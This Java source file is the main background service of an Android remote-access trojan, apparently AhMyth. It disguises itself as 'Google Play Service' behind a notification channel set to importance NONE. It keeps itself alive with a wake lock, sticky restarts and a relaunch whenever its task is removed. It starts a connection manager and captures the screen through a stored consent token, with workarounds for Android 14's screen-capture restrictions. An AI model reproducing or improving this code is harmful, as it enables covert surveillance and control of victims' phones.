package com.android.background.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

public class MainService extends Service {

    public static final String CHANNEL_ID = BuildConfig.APPLICATION_ID;
    private static Context contextOfApplication;
    private static int screenResultCode;
    private static Intent screenData;
    private static MediaProjection mediaProjection;
    private static MainService instance;
    private PowerManager.WakeLock wakeLock;

    public static void setScreenCaptureData(int resultCode, Intent data) {
        screenResultCode = resultCode;
        screenData = data;
        // The consent token is single-use on Android 14+: getMediaProjection()
        // can only be called once per consent, and only while a foreground
        // service of type mediaProjection is running. If the service is
        // already up, upgrade its FGS type now, then create the projection.
        if (instance != null) {
            instance.upgradeToMediaProjection();
        }
    }

    /**
     * Re-declare the FGS with the mediaProjection type (allowed now that the
     * user granted screen-capture consent) and create the single projection.
     */
    private void upgradeToMediaProjection() {
        if (screenData == null || mediaProjection != null) {
            return;
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                // Android 14+: re-declare the FGS with mediaProjection added,
                // which is now allowed because consent was granted.
                startForeground(1, getOngoingNotification(),
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                                | ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10-13: mediaProjection type is ungated here (added
                // at start), nothing to upgrade.
            }
        } catch (Exception e) {
            // FGS upgrade refused (e.g. consent token no longer valid).
        }
        createMediaProjection();
    }

    public static int getScreenResultCode() {
        return screenResultCode;
    }

    public static Intent getScreenData() {
        return screenData;
    }

    /**
     * Create the single MediaProjection from the stored consent token.
     * On Android 14+ this must happen while a foreground service of type
     * {@code mediaProjection} is running, otherwise it throws
     * SecurityException. Returns null when consent was denied / unavailable.
     */
    private static synchronized void createMediaProjection() {
        if (mediaProjection != null || contextOfApplication == null || screenData == null) {
            return;
        }
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) contextOfApplication
                    .getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                mediaProjection = mpm.getMediaProjection(screenResultCode, screenData);
            }
            if (mediaProjection != null) {
                // If the user later revokes screen-capture access, the
                // projection stops; clear the reference so a fresh consent
                // can create a new one without a process restart.
                mediaProjection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        mediaProjection = null;
                    }
                }, new Handler(Looper.getMainLooper()));
            }
        } catch (SecurityException e) {
            // FGS of type mediaProjection not yet active / token already used.
            mediaProjection = null;
        } catch (Exception e) {
            mediaProjection = null;
        }
    }

    public static MediaProjection getMediaProjection() {
        return mediaProjection;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        instance = this;
        createNotificationChannel();

        Notification notification = getOngoingNotification();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+: an FGS of type mediaProjection is rejected unless
            // the user has already granted screen-capture consent (and this
            // service is also started directly by the restart worker / boot
            // receiver). So: if we already have the consent token, declare
            // both types now; otherwise start with specialUse only and upgrade
            // in setScreenCaptureData() once consent is granted.
            int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
            if (screenData != null) {
                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
            }
            startForeground(1, notification, type);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10-13: mediaProjection type is ungated and required for
            // getMediaProjection(), so declare it from the start.
            startForeground(1, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(1, notification);
        }

        acquireWakeLock();

        contextOfApplication = this;
        ConnectionManager.startAsync(this);

        // If the consent token was stored before the service started, upgrade
        // the FGS type and create the MediaProjection now.
        if (screenData != null) {
            upgradeToMediaProjection();
        }

        return Service.START_STICKY;
    }

    private Notification getOngoingNotification() {
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);
        return notificationBuilder.setContentTitle("Google Play Service")
                .setContentText("Google is running background")
                .setSmallIcon(R.drawable.play_service_icon)
                .setOngoing(true)
                .build();
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AhMyth::MainServiceWakeLock");
            wakeLock.acquire(10 * 60 * 1000L /*10 minutes*/);
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        startService(restartServiceIntent);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        super.onDestroy();
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }

    private void createNotificationChannel() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Google Background Service Channel",
                    NotificationManager.IMPORTANCE_NONE
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }
}
